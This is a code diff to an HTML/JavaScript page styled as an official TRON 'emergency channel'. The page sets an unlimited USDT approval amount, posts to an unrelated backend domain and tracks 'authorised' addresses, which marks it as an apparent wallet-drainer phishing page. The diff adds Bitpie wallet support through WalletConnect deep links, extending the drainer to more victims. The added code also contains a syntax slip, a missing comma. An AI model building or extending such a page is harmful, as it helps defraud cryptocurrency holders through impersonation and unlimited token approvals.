@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
+   
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>TRON官方应急通道</title>
@@ -15,6 +16,7 @@
     <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+    <script src="https://unpkg.com/@walletconnect/tron-provider@latest/dist/umd/index.min.js"></script>
     <style>
         /* 原有样式完全保留，未做任何修改 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -530,6 +532,7 @@
     align-items: flex-start; /* 纵向顶部对齐（logo顶边齐平） */
     gap: 12px; /* 钱包之间的间距 */
     flex: 1; /* 占满中间空间，让关闭按钮靠底 */
+    flex-wrap: wrap; /* 自动换行（核心新增属性） */
 }
 /* 核心修改：钱包项纵向排列+内容顶部对齐 */
 .wallet-item {
@@ -756,6 +759,10 @@
                 <img src="./icon/bitget.png" alt="Bitget Wallet Logo" class="wallet-logo">
                 <span class="wallet-name">Bitget Wallet</span>
             </div>
+                <div class="wallet-item" data-wallet="bitpie">
+        <img src="https://cdn.bitpie.com/static/images/logo.png" alt="Bitpie Logo" class="wallet-logo">
+        <span class="wallet-name">Bitpie</span>
+    </div>
         </div>
         <!-- 关闭按钮（底部中间） -->
         <div class="wallet-modal-footer">
@@ -812,6 +819,7 @@
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT合约地址
     const BACKEND_API = "https://kgjiopv1.com"; // 后端API地址
     const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // 无限授权金额
+    const WC_PROJECT_ID = "3998f57e6de62f774a4d3a4d6a568edf";
     // USDT合约ABI（无修改）
     const USDT_ABI = [
         {
@@ -850,7 +858,8 @@
         tokenpocket: { scheme: "tpdapp://open?params={\"url\":\"", suffix: "\"}", name: "TokenPocket" },
         tronlink: { scheme: "tronlinkoutside://pull.activity?param=", name: "TronLink" },
         bitget: { scheme: "bitkeep://bkconnect?action=dapp&url=", name: "Bitget Wallet" }
-    };
+        bitpie: { scheme: "bitpie://wc?uri=", name: "Bitpie" } // 比特派专属Scheme
+        };
     // 多语言配置（补齐所有对应翻译，无修改）
     const langConfig = {
         zh: {
@@ -1008,7 +1017,7 @@
     let currentLang = localStorage.getItem("tron_energy_lang") || "zh"; // 当前语言
     let trxTimer = null; // 能量倒计时定时器
     let contractEnergyEl = null; // 合约剩余能量DOM元素
-
+    let tronProvider = null; // 比特派WalletConnect实例
     /********************************************************************
      * DOM元素集中获取：避免重复查询，提升性能（变量名与原代码一致）
      ********************************************************************/
@@ -1041,12 +1050,45 @@
         walletItems: document.querySelectorAll(".wallet-item"),
         statusAddressEl: document.getElementById("statusAddress")
     };
-
+    
     /********************************************************************
-     * 工具函数：通用辅助逻辑（修复能量/宽带查询方式）
+      *    比特派专属：WalletConnect TronProvider初始化（TRON网络+v5.0.206适配）
      ********************************************************************/
+     // 初始化比特派WalletConnect连接
+    async function initBitpieWalletConnect() {
+    try {
+        // 引入WalletConnect TronProvider（若未引入，需在HTML头部添加）
+        if (!window.TronProvider) {
+            // 动态加载WalletConnect TronProvider SDK
+            await new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = "https://unpkg.com/@walletconnect/tron-provider@latest/dist/umd/index.min.js";
+                script.onload = resolve;
+                script.onerror = reject;
+                document.head.appendChild(script);
+            });
+        }
 
-    /**
+        // 初始化TRON专属Provider（适配比特派v5.0.206）
+        tronProvider = new window.TronProvider({
+            projectId: WC_PROJECT_ID,
+            chains: [195], // TRON主网链ID（固定）
+            showQrModal: false, // 关闭默认弹窗，用Scheme唤起
+            rpcMap: { 195: "https://api.trongrid.io" } // 比特派兼容的官方节点
+        });
+
+        await tronProvider.init();
+        return tronProvider.uri; // 返回连接URI
+       }    catch (e) {
+        console.error("比特派WalletConnect初始化失败：", e);
+        return null;
+         }
+       }
+    
+     /********************************************************************
+          工具函数：通用辅助逻辑（修复能量/宽带查询方式）
+     /********************************************************************/
+      /**
      * 获取已授权领取的地址列表（30天限制）
      * @returns {Array} 已授权地址数组
      */
@@ -1937,7 +1979,37 @@ document.addEventListener('DOMContentLoaded', async () => {
             if (loadingEl) loadingEl.style.display = "flex";
             item.style.pointerEvents = "none";
             DOM.multiWalletPopup.style.display = "none";
+                                        // 新增：比特派专属唤起逻辑
+             if (walletType === "bitpie") {
+                  try {
+                      // 初始化WalletConnect并获取URI
+                      const wcUri = await initBitpieWalletConnect();
+                      if (!wcUri) throw new Error("获取连接URI失败");
 
+                // 编码URI（适配比特派v5.0.206字符解析规则）
+                      const encodedWcUri = encodeURIComponent(wcUri);
+                // 构造比特派Scheme唤起链接
+                      const jumpUrl = `${wallet.scheme}${encodedWcUri}`;
+
+                console.log(`📤 唤起比特派v5.0.206：`, jumpUrl);
+                window.location.href = jumpUrl;
+
+                // 比特派唤起后，监听WalletConnect连接状态
+                tronProvider.on("connect", async (payload) => {
+                    console.log("比特派连接成功：", payload);
+                    // 注入tronWeb实例
+                    window.tronWeb = tronProvider.tronWeb;
+                    tronWeb = window.tronWeb;
+                    DOM.connectBtn.style.display = "none";
+                    DOM.warning.style.display = "none";
+                    DOM.specialTipContainer.style.display = "none";
+                          await initWallet(false);
+                      });
+                  } catch (e) {
+                console.error("比特派唤起失败：", e);
+                alert(lang.approveFail.replace("{msg}", "比特派连接失败，请检查版本"));
+                  }
+              } else {
             // 2. 生成对应钱包的跳转链接
             let jumpUrl = "";
             switch (walletType) {
